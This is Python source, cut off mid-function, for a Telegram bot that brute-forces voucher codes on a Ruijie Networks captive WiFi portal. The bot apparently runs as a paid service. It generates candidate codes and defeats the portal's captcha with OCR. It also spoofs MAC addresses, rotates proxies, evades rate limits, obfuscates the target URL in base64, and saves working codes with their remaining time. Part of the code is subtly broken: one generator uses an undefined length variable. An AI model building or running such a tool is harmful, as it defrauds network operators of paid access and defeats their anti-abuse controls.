"""
Voucher Checker Bot — Ultimate Version
=======================================
- SQLite Persistent Storage
- Enhanced Admin Security with OTP
- Improved Captcha OCR with Tesseract Fallback
- Session Pool Management
- Exponential Backoff Retry Logic
- Proxy Pool with Health Check
- Rate Limiting & Spam Protection
- Clean Code with Classes & Type Hints
"""

import asyncio
import base64
import json
import logging
import os
import random
import re
import sqlite3
import string
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from itertools import product as iter_product
from typing import Dict, List, Optional, Set, Tuple, Any, Union

import aiohttp
import cv2
import ddddocr
import numpy as np
from aiohttp import web
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ─────────────────────────────────────────────────────────────────────────────
# Logging
# ─────────────────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# Environment Variables
# ─────────────────────────────────────────────────────────────────────────────
BOT_TOKEN    = os.environ.get("BOT_TOKEN", "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
REPO_OWNER   = os.environ.get("REPO_OWNER", "")
REPO_NAME    = os.environ.get("REPO_NAME", "")
ADMIN_ID     = os.environ.get("ADMIN_ID", "")
ADMINS       = [a.strip() for a in ADMIN_ID.split(",") if a.strip()]
ADMIN_USERNAME = os.environ.get("ADMIN_USERNAME", "@thuyahtetaung123")

if not BOT_TOKEN:
    log.error("BOT_TOKEN environment variable is required!")
    exit(1)

if not ADMINS:
    log.warning("No ADMIN_ID set. Some admin commands will be unavailable.")

# ─────────────────────────────────────────────────────────────────────────────
# Constants
# ─────────────────────────────────────────────────────────────────────────────
POST_URL = base64.b64decode(
    b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
).decode()

PLAN_RE = re.compile(r"^(\d+(mo|min|h|d|m))+$|^unlimit(ed)?$", re.IGNORECASE)

CHARSETS = {
    1: string.digits,
    2: string.ascii_lowercase,
    3: string.ascii_uppercase,
    4: string.ascii_letters,
    5: string.ascii_lowercase + string.digits,
}

MODE_NAMES = {
    1: "ဂဏန်း (0-9)",
    2: "အသေး (a-z)",
    3: "အကြီး (A-Z)",
    4: "အကြီး+အသေး (a-zA-Z)",
    5: "စာ+ဂဏန်း (a-z0-9)",
}

DEFAULT_NOTIFY = True
CONCURRENCY    = 100
MAX_CONCURRENT_SCANS = 10
BATCH_SIZE     = 500
CAPTCHA_RETRIES = 5
VOUCHER_RETRIES = 3
RATE_LIMIT_SCANS_PER_HOUR = 3
RATE_LIMIT_BROADCAST_PER_HOUR = 1

# ─────────────────────────────────────────────────────────────────────────────
# Database Layer (SQLite)
# ─────────────────────────────────────────────────────────────────────────────
class Database:
    def __init__(self, db_path="bot_data.db"):
        self.db_path = db_path
        self._init_db()

    def _init_db(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            # Users table
            c.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    chat_id TEXT PRIMARY KEY,
                    is_paid BOOLEAN DEFAULT 0,
                    is_approved BOOLEAN DEFAULT 0,
                    session_url TEXT,
                    notify BOOLEAN DEFAULT 1,
                    last_scan TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            # Scans table
            c.execute("""
                CREATE TABLE IF NOT EXISTS scans (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    chat_id TEXT,
                    mode TEXT,
                    length INTEGER,
                    target INTEGER,
                    plan_filters TEXT,
                    start_digit TEXT,
                    started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    stopped_at TIMESTAMP,
                    found_count INTEGER DEFAULT 0,
                    checked_count INTEGER DEFAULT 0,
                    status TEXT DEFAULT 'running'
                )
            """)
            # Success codes table
            c.execute("""
                CREATE TABLE IF NOT EXISTS success_codes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    chat_id TEXT,
                    code TEXT,
                    session_id TEXT,
                    plan TEXT,
                    found_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    UNIQUE(chat_id, code)
                )
            """)
            # Limited codes table
            c.execute("""
                CREATE TABLE IF NOT EXISTS limited_codes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    chat_id TEXT,
                    code TEXT,
                    found_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    UNIQUE(chat_id, code)
                )
            """)
            # Admin logs table
            c.execute("""
                CREATE TABLE IF NOT EXISTS admin_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    admin_id TEXT,
                    command TEXT,
                    details TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            # Rate limiting table
            c.execute("""
                CREATE TABLE IF NOT EXISTS rate_limits (
                    chat_id TEXT,
                    action TEXT,
                    count INTEGER DEFAULT 0,
                    reset_at TIMESTAMP,
                    PRIMARY KEY (chat_id, action)
                )
            """)
            conn.commit()

    def get_user(self, chat_id: str) -> Dict:
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,))
            row = c.fetchone()
            if row:
                columns = [description[0] for description in c.description]
                return dict(zip(columns, row))
            return None

    def upsert_user(self, chat_id: str, **kwargs):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            existing = self.get_user(chat_id)
            if existing:
                updates = []
                values = []
                for key, val in kwargs.items():
                    updates.append(f"{key} = ?")
                    values.append(val)
                values.append(chat_id)
                c.execute(f"UPDATE users SET {', '.join(updates)}, updated_at = CURRENT_TIMESTAMP WHERE chat_id = ?", values)
            else:
                cols = ["chat_id"] + list(kwargs.keys())
                placeholders = ["?"] * (1 + len(kwargs))
                values = [chat_id] + list(kwargs.values())
                c.execute(f"INSERT INTO users ({', '.join(cols)}) VALUES ({', '.join(placeholders)})", values)
            conn.commit()

    def add_success_code(self, chat_id: str, code: str, session_id: str, plan: str):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute(
                "INSERT OR IGNORE INTO success_codes (chat_id, code, session_id, plan) VALUES (?, ?, ?, ?)",
                (chat_id, code, session_id, plan)
            )
            conn.commit()

    def get_success_codes(self, chat_id: str) -> List[Dict]:
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute("SELECT code, session_id, plan, found_at FROM success_codes WHERE chat_id = ? ORDER BY found_at DESC", (chat_id,))
            return [{"code": row[0], "session_id": row[1], "plan": row[2], "found_at": row[3]} for row in c.fetchall()]

    def add_limited_code(self, chat_id: str, code: str):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute("INSERT OR IGNORE INTO limited_codes (chat_id, code) VALUES (?, ?)", (chat_id, code))
            conn.commit()

    def get_limited_codes(self, chat_id: str) -> List[str]:
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute("SELECT code FROM limited_codes WHERE chat_id = ? ORDER BY found_at DESC", (chat_id,))
            return [row[0] for row in c.fetchall()]

    def log_admin_action(self, admin_id: str, command: str, details: str = ""):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO admin_logs (admin_id, command, details) VALUES (?, ?, ?)", (admin_id, command, details))
            conn.commit()

    def check_rate_limit(self, chat_id: str, action: str, max_per_hour: int) -> bool:
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            now = datetime.now(timezone.utc)
            reset_at = now + timedelta(hours=1)
            c.execute("SELECT count, reset_at FROM rate_limits WHERE chat_id = ? AND action = ?", (chat_id, action))
            row = c.fetchone()
            if row:
                count, reset = row
                reset_dt = datetime.fromisoformat(reset)
                if now < reset_dt:
                    if count >= max_per_hour:
                        return False
                    c.execute("UPDATE rate_limits SET count = count + 1 WHERE chat_id = ? AND action = ?", (chat_id, action))
                else:
                    c.execute("UPDATE rate_limits SET count = 1, reset_at = ? WHERE chat_id = ? AND action = ?", (reset_at.isoformat(), chat_id, action))
            else:
                c.execute("INSERT INTO rate_limits (chat_id, action, count, reset_at) VALUES (?, ?, 1, ?)", (chat_id, action, reset_at.isoformat()))
            conn.commit()
            return True

# ─────────────────────────────────────────────────────────────────────────────
# Proxy Manager
# ─────────────────────────────────────────────────────────────────────────────
class ProxyManager:
    def __init__(self, proxies: List[str] = None):
        self.proxies = proxies or []
        self.failed_proxies = set()
        self._lock = asyncio.Lock()

    def set_proxies(self, proxies: List[str]):
        self.proxies = proxies
        self.failed_proxies.clear()

    async def get_proxy(self) -> Optional[str]:
        async with self._lock:
            available = [p for p in self.proxies if p not in self.failed_proxies]
            if not available:
                self.failed_proxies.clear()
                available = self.proxies
            if not available:
                return None
            return random.choice(available)

    def mark_failed(self, proxy: str):
        self.failed_proxies.add(proxy)

    def mark_success(self, proxy: str):
        self.failed_proxies.discard(proxy)

# ─────────────────────────────────────────────────────────────────────────────
# Captcha OCR Manager
# ─────────────────────────────────────────────────────────────────────────────
class CaptchaOCR:
    def __init__(self):
        self._ocr = ddddocr.DdddOcr(show_ad=False)
        self._tesseract_available = False
        try:
            import pytesseract
            self._tesseract = pytesseract
            self._tesseract_available = True
        except ImportError:
            log.warning("Tesseract not available, using ddddocr only")

    async def solve(self, image_bytes: bytes) -> Optional[str]:
        """Solve captcha using ddddocr, fallback to Tesseract if available."""
        # Try ddddocr first (fast)
        text = await self._solve_ddddocr(image_bytes)
        if text and len(text) >= 4:
            return text

        # Fallback to Tesseract
        if self._tesseract_available:
            text = await self._solve_tesseract(image_bytes)
            if text and len(text) >= 4:
                return text

        # If both fail, try ddddocr with different preprocessing
        return await self._solve_ddddocr_advanced(image_bytes)

    async def _solve_ddddocr(self, image_bytes: bytes) -> Optional[str]:
        try:
            nparr = np.frombuffer(image_bytes, np.uint8)
            img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            if img is None:
                return None
            gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
            blur = cv2.GaussianBlur(gray, (3, 3), 0)
            _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
            _, buffer = cv2.imencode('.png', thresh)
            result = self._ocr.classification(buffer.tobytes())
            return result.upper()
        except Exception as e:
            log.debug(f"ddddocr error: {e}")
            return None

    async def _solve_tesseract(self, image_bytes: bytes) -> Optional[str]:
        try:
            nparr = np.frombuffer(image_bytes, np.uint8)
            img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            if img is None:
                return None
            gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
            _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
            result = self._tesseract.image_to_string(thresh, config="--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
            return result.strip().upper()
        except Exception as e:
            log.debug(f"Tesseract error: {e}")
            return None

    async def _solve_ddddocr_advanced(self, image_bytes: bytes) -> Optional[str]:
        """Try different preprocessing methods."""
        try:
            nparr = np.frombuffer(image_bytes, np.uint8)
            img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            if img is None:
                return None

            # Try different thresholds
            for method in [
                lambda: cv2.threshold(cv2.cvtColor(img, cv2.COLOR_BGR2GRAY), 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU),
                lambda: cv2.adaptiveThreshold(cv2.cvtColor(img, cv2.COLOR_BGR2GRAY), 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C, cv2.THRESH_BINARY, 11, 2),
            ]:
                try:
                    _, thresh = method()
                    _, buffer = cv2.imencode('.png', thresh)
                    result = self._ocr.classification(buffer.tobytes())
                    if result and len(result) >= 4:
                        return result.upper()
                except:
                    continue
            return None
        except Exception as e:
            log.debug(f"Advanced ddddocr error: {e}")
            return None

# ─────────────────────────────────────────────────────────────────────────────
# Bot Class
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class ScanState:
    chat_id: str
    mode: Union[int, str]
    length: Optional[int] = None
    target: Optional[int] = None
    plan_filters: List[str] = field(default_factory=list)
    start_digit: Optional[str] = None
    task: Optional[asyncio.Task] = None
    stop: bool = False
    scan_id: str = field(default_factory=lambda: str(uuid.uuid4()))

class VoucherBot:
    def __init__(self):
        self.bot = AsyncTeleBot(BOT_TOKEN)
        self.db = Database()
        self.captcha = CaptchaOCR()
        self.proxy_manager = ProxyManager()
        self.user_data: Dict[int, Dict] = {}  # Cache for fast access
        self.scan_tasks: Dict[int, ScanState] = {}
        self.success_texts: Dict[int, List[Dict]] = {}
        self.limited_texts: Dict[int, List[str]] = {}
        self.success_messages: Dict[int, int] = {}
        self.limited_messages: Dict[int, int] = {}
        self.notify_setting: Dict[int, bool] = {}
        self.last_scan_params: Dict[int, Dict] = {}
        self.pending_brute: Dict[int, Dict] = {}
        self.captcha_state: Dict[int, Dict] = {}
        self.active_scans_count = 0
        self.active_scans_lock = asyncio.Lock()
        self._voucher_sem = asyncio.Semaphore(CONCURRENCY)
        self._session = None
        self._connector = None
        self._start_time = time.monotonic()
        self._admin_otp: Dict[str, Dict] = {}  # {chat_id: {"otp": str, "expires": float, "action": str}}

        # Load users from DB to cache
        self._load_users()

    def _load_users(self):
        """Load all users from DB into cache."""
        with sqlite3.connect(self.db.db_path) as conn:
            c = conn.cursor()
            c.execute("SELECT chat_id, is_paid, is_approved, session_url, notify FROM users")
            for row in c.fetchall():
                chat_id = int(row[0])
                self.user_data[chat_id] = {
                    "session_url": row[3],
                    "last_admin_notified_url": None,
                    "current_display_codes": [],
                }
                if row[1]:
                    self.user_data[chat_id]["paid"] = True
                if row[2]:
                    self.user_data[chat_id]["approved"] = True
                if row[4]:
                    self.notify_setting[chat_id] = bool(row[4])

    def is_admin(self, user_id) -> bool:
        return str(user_id) in ADMINS

    def is_paid_or_approved(self, chat_id: int) -> bool:
        user = self.db.get_user(str(chat_id))
        if user:
            return user.get("is_paid", False) or user.get("is_approved", False)
        return False

    async def ensure_user(self, chat_id: int):
        if chat_id not in self.user_data:
            self.user_data[chat_id] = {
                "session_url": None,
                "last_admin_notified_url": None,
                "current_display_codes": [],
            }
            self.db.upsert_user(str(chat_id))

    # ─────────────────────────────────────────────────────────────────────────
    # Admin OTP
    # ─────────────────────────────────────────────────────────────────────────
    def generate_otp(self, chat_id: str, action: str) -> str:
        otp = "".join(random.choices(string.digits, k=6))
        self._admin_otp[chat_id] = {
            "otp": otp,
            "expires": time.time() + 120,  # 2 minutes
            "action": action,
        }
        return otp

    def verify_otp(self, chat_id: str, otp: str) -> Optional[str]:
        data = self._admin_otp.get(chat_id)
        if not data:
            return None
        if time.time() > data["expires"]:
            self._admin_otp.pop(chat_id, None)
            return None
        if data["otp"] == otp:
            action = data["action"]
            self._admin_otp.pop(chat_id, None)
            return action
        return None

    # ─────────────────────────────────────────────────────────────────────────
    # Session Management
    # ─────────────────────────────────────────────────────────────────────────
    async def get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            self._connector = aiohttp.TCPConnector(
                limit=500,
                limit_per_host=100,
                ttl_dns_cache=300,
                ssl=False,
                enable_cleanup_closed=True,
            )
            timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_connect=10)
            self._session = aiohttp.ClientSession(
                timeout=timeout,
                connector=self._connector,
                connector_owner=False,
            )
        return self._session

    async def close_session(self):
        if self._session and not self._session.closed:
            await self._session.close()
        if self._connector:
            await self._connector.close()

    # ─────────────────────────────────────────────────────────────────────────
    # Rate Limiting
    # ─────────────────────────────────────────────────────────────────────────
    async def check_rate_limit(self, chat_id: int, action: str, max_per_hour: int) -> bool:
        return self.db.check_rate_limit(str(chat_id), action, max_per_hour)

    # ─────────────────────────────────────────────────────────────────────────
    # MAC / Session Helpers
    # ─────────────────────────────────────────────────────────────────────────
    def get_mac(self) -> str:
        first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
        mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
        return ':'.join(f'{x:02x}' for x in mac)

    def replace_mac(self, url: str, new_mac: str) -> str:
        return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

    async def get_session_id(self, sess: aiohttp.ClientSession, session_url: str, previous_session_id: Optional[str] = None) -> Optional[str]:
        mac = self.get_mac()
        url = self.replace_mac(session_url, new_mac=mac)
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }
        proxy = await self.proxy_manager.get_proxy()
        try:
            async with sess.get(url, headers=headers, allow_redirects=True, proxy=proxy) as req:
                response = str(req.url)
                m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
                if m:
                    self.proxy_manager.mark_success(proxy) if proxy else None
                    return m.group(1)
                return previous_session_id
        except Exception as e:
            if proxy:
                self.proxy_manager.mark_failed(proxy)
            log.debug(f"get_session_id error: {e}")
            return previous_session_id

    # ─────────────────────────────────────────────────────────────────────────
    # WiFiDog Resolver
    # ─────────────────────────────────────────────────────────────────────────
    async def resolve_wifidog_url(self, wifidog_url: str) -> Optional[str]:
        try:
            mac = self.get_mac()
            url = self.replace_mac(wifidog_url, new_mac=mac)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            }
            proxy = await self.proxy_manager.get_proxy()
            session = await self.get_session()
            async with session.get(url, allow_redirects=True, headers=headers, proxy=proxy,
                                   timeout=aiohttp.ClientTimeout(total=20)) as r:
                final_url = str(r.url)
                if "sessionId" in final_url:
                    log.info(f"[WiFiDog] Resolved: {final_url[:80]}...")
                    return final_url
                body = await r.text()
                m = re.search(r"sessionId['\"]?\s*[:=]\s*['\"]?([a-zA-Z0-9]+)", body)
                if m:
                    session_url = (
                        f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
                        f"?RES=./../expand/res/vkrbnozfeh2oltvlvlw&IS_EG=0&sessionId={m.group(1)}"
                    )
                    log.info(f"[WiFiDog] Resolved from body: {session_url[:80]}...")
                    return session_url
                log.warning(f"[WiFiDog] Could not resolve. Final URL: {final_url[:100]}")
                return None
        except Exception as e:
            log.error(f"[WiFiDog] resolve error: {e}")
            return None

    async def check_session_url(self, url: str) -> bool:
        if "sessionId" in url:
            try:
                session = await self.get_session()
                async with session.get(url, allow_redirects=True,
                                       timeout=aiohttp.ClientTimeout(total=15)) as r:
                    return "sessionId" in str(r.url)
            except Exception:
                return False
        if "wifidog" in url or "stage=portal" in url:
            resolved = await self.resolve_wifidog_url(url)
            return resolved is not None
        return False

    # ─────────────────────────────────────────────────────────────────────────
    # Captcha
    # ─────────────────────────────────────────────────────────────────────────
    async def get_captcha(self, chat_id: int, sess: aiohttp.ClientSession, session_id: str) -> Optional[str]:
        entry = self.captcha_state.get(chat_id, {})
        if entry.get("session_id") == session_id and entry.get("auth_code"):
            return entry["auth_code"]

        for _ in range(CAPTCHA_RETRIES):
            try:
                image = await self.captcha_image(sess, session_id)
                text = await self.captcha.solve(image)
                if not text:
                    continue
                verified = await self.verify_captcha(sess, session_id, text)
                if verified:
                    self.captcha_state[chat_id] = {"session_id": session_id, "auth_code": text}
                    return text
            except Exception as e:
                log.debug(f"Captcha error: {e}")
                continue
        return None

    async def captcha_image(self, sess: aiohttp.ClientSession, session_id: str) -> bytes:
        headers = {
            'authority': 'portal-as.ruijienetworks.com',
            'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9,my;q=0.8',
            'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'image',
            'sec-fetch-mode': 'no-cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        }
        params = {'sessionId': session_id, '_t': str(time.time())}
        proxy = await self.proxy_manager.get_proxy()
        async with sess.get(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
            params=params, headers=headers, proxy=proxy
        ) as req:
            return await req.read()

    async def verify_captcha(self, sess: aiohttp.ClientSession, session_id: str, text: str) -> Optional[str]:
        headers = {
            'authority': 'portal-as.ruijienetworks.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,my;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://portal-as.ruijienetworks.com',
            'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        }
        json_data = {'sessionId': session_id, 'authCode': text}
        proxy = await self.proxy_manager.get_proxy()
        async with sess.post(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
            headers=headers, json=json_data, proxy=proxy
        ) as req:
            data = await req.json()
            log.debug(f"[verify_captcha] authCode={text} response={data}")
            if data.get("success") == True:
                return session_id
            return None

    # ─────────────────────────────────────────────────────────────────────────
    # Balance / Plan Helpers
    # ─────────────────────────────────────────────────────────────────────────
    async def get_balance(self, session_id: str) -> str:
        headers = {
            "accept": "application/json, */*; q=0.01",
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "x-requested-with": "XMLHttpRequest",
        }
        urls = [
            f"http://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}",
            f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}",
        ]
        proxy = await self.proxy_manager.get_proxy()
        session = await self.get_session()
        for url in urls:
            try:
                async with session.get(url, headers=headers, proxy=proxy,
                                       timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status != 200:
                        continue
                    data = await r.json(content_type=None)
                    for d in [data, data.get("result", {}), data.get("data", {})]:
                        if not isinstance(d, dict):
                            continue
                        for k in ("totalMinutes", "remainingMinutes", "remainMinutes",
                                  "leftMinutes", "balance", "remaining"):
                            if d.get(k) is not None:
                                return self._fmt_min(d[k])
                        for k in ("remainingSeconds", "remainTime", "remainingTime",
                                  "leftTime", "timeLeft", "remain_time"):
                            if d.get(k) is not None:
                                return self._fmt_sec(d[k])
            except Exception as e:
                log.debug(f"get_balance {url}: {e}")
        return "N/A"

    def _fmt_sec(self, v: int) -> str:
        s = int(v)
        h, r = divmod(s, 3600)
        m = r // 60
        if h:
            return f"{h}h {m}m"
        if m:
            return f"{m}m"
        return f"{s}s"

    def _fmt_min(self, v: int) -> str:
        t = int(v)
        if t <= 0:
            return "0m"
        if t < 60:
            return f"{t}m"
        h, m = divmod(t, 60)
        if h < 24:
            return f"{h}h {m}m" if m else f"{h}h"
        d, rh = divmod(h, 24)
        if d < 30:
            return f"{d}d {rh}h" if rh else f"{d}d"
        mo, rd = divmod(d, 30)
        return f"{mo}mo {rd}d" if rd else f"{mo}mo"

    def plan_to_min(self, s: str) -> float:
        if not s:
            return 0
        s = s.strip().lower()
        if s in ("unlimit", "unlimited"):
            return float("inf")
        total = 0
        for v, u in re.findall(r"(\d+)\s*(mo|min|h|d|m)\b", s):
            v = int(v)
            if u == "mo":
                total += v * 43200
            elif u == "d":
                total += v * 1440
            elif u == "h":
                total += v * 60
            elif u in ("min", "m"):
                total += v
        return total

    # ─────────────────────────────────────────────────────────────────────────
    # Code Generators
    # ─────────────────────────────────────────────────────────────────────────
    def iter_codes(self, mode, start_digit=None):
        if isinstance(mode, int):
            cs = CHARSETS.get(mode)
            if not cs:
                raise ValueError(f"Invalid mode: {mode}")
            total = len(cs) ** length
            if total <= 1_000_000:
                codes = ["".join(p) for p in iter_product(cs, repeat=length)]
                random.shuffle(codes)
                yield from codes
            else:
                while True:
                    yield "".join(random.choices(cs, k=length))
            return

        # String modes
        if mode in ["6", "7", "8", "9"]:
            length = int(mode)
            if start_digit is not None:
                start = int(start_digit) * (10 ** (length - 1))
                end = (int(start_digit) + 1) * (10 ** (length - 1))
                for i in range(start, end):
                    yield str(i).zfill(length)
                return
            if mode in ["6", "7", "8"]:
                codes = [str(i).zfill(length) for i in range(10 ** length)]
                random.shuffle(codes)
                yield from codes
                return
            if mode == "9":
                while True:
                    yield "".join(random.choice(string.digits) for _ in range(9))
                return

        if mode == "ascii-lower":
            while True:
                yield "".join(random.choice(string.ascii_lowercase) for _ in range(6))
        if mode == "ascii-lower9":
            while True:
                yield "".join(random.choice(string.ascii_lowercase) for _ in range(9))
        if mode == "all" or mode == "mixed":
            chars = string.ascii_lowercase + string.digits
            while True:
                yield "".join(random.choice(chars) for _ in range(6))
        if mode == "mixed8":
            chars = string.ascii_lowercase + string.digits
            while True:
                yield "".join(random.choice(chars) for _ in range(8))
        if mode == "mixed9":
            chars = string.ascii_lowercase + string.digits
            while True:
                yield "".join(random.choice(chars) for _ in range(9))

    def known_total(self, mode, length=None) -> Optional[int]:
        if isinstance(mode, int):
            cs = CHARSETS.get(mode)
            if not cs:
                return None
            t = len(cs) ** length
            return t if t <= 1_000_000 else None
        if mode in ["6", "7", "8"]:
            return 10 ** int(mode)
        return None

    # ─────────────────────────────────────────────────────────────────────────
    # Progress Formatting
    # ─────────────────────────────────────────────────────────────────────────
    def format_progress(self, checked: int, total: Optional[int], speed: float, found: int) -> str:
        speed_str = f"{speed:,.0f} codes/min"
        if total is not None:
            bar_length = 20
            percent = (checked / total) * 100
            filled = min(bar_length, int(percent / 5))
            bar = "█" * filled + "░" * (bar_length - filled)
            return (
                f"🔍Scanning VOUCHER Codes...\n\n"
                f"📦Checked : {checked:,}/{total:,}\n"
                f"📊Progress : {percent:.2f}%\n"
                f"⚡Speed : {speed_str}\n"
                f"✅Success code hit : {found}\n"
                f"[{bar}]"
            )
        return (
            f"🔍Scanning VOUCHER Codes...\n\n"
            f"📦Checked : {checked:,}\n"
            f"⚡Speed : {speed_str}\n"
            f"✅Success code hit : {found}\n"
            f"📊Status : running\n"
        )

    # ─────────────────────────────────────────────────────────────────────────
    # Core Voucher Check
    # ─────────────────────────────────────────────────────────────────────────
    async def perform_check(self, session_url: str, code: str, chat_id: int,
                            scan_id: str = None, recheck: bool = False,
                            message=None, plan_filters: List[str] = None) -> Optional[str]:
        if not recheck:
            state = self.scan_tasks.get(chat_id)
            if not state or state.scan_id != scan_id:
                return None

        response = None
        session_id = None
        session = await self.get_session()

        for attempt in range(VOUCHER_RETRIES):
            try:
                # Get session ID with retry
                for _ in range(3):
                    session_id = await self.get_session_id(session, session_url, None)
                    if session_id:
                        break
                    await asyncio.sleep(1)
                if not session_id:
                    continue

                # Get captcha
                auth_code = await self.get_captcha(chat_id, session, session_id)
                if not auth_code:
                    continue

                if not recheck:
                    state = self.scan_tasks.get(chat_id)
                    if not state or state.scan_id != scan_id or state.stop:
                        return None

                data = {
                    "accessCode": code,
                    "sessionId": session_id,
                    "apiVersion": 1,
                    "authCode": auth_code,
                }
                headers = {
                    "authority": "portal-as.ruijienetworks.com",
                    "accept": "*/*",
                    "content-type": "application/json",
                    "origin": "https://portal-as.ruijienetworks.com",
                    "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
                    "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                }
                proxy = await self.proxy_manager.get_proxy()
                async with session.post(POST_URL, json=data, headers=headers, proxy=proxy) as req:
                    response = await req.text()
                    log.debug(f"[voucher] code={code} attempt={attempt+1} resp={response[:80]}")
                    if response and 'request limited' in response:
                        await asyncio.sleep(2 ** attempt)  # Exponential backoff
                        response = None
                        continue
                    break
            except aiohttp.ClientError as e:
                log.debug(f"[perform_check] client error attempt {attempt+1}: {e}")
                await asyncio.sleep(2 ** attempt)
                continue
            except Exception as e:
                log.debug(f"[perform_check] error attempt {attempt+1}: {e}")
                await asyncio.sleep(2 ** attempt)
                continue

        if not response:
            return None

        # ── SUCCESS ──
        if 'logonUrl' in response:
            if recheck:
                return code

            # Get plan info
            plan_info = await self.get_balance(session_id)
            if not plan_info or plan_info == "N/A":
                plan_info = "📋 Plan: Unknown | ⏳ Time: Unknown"

            # Check plan filters
            if plan_filters:
                mins = self.plan_to_min(plan_info)
                if not any(mins >= self.plan_to_min(f) for f in plan_filters):
                    return None

            # Save to DB
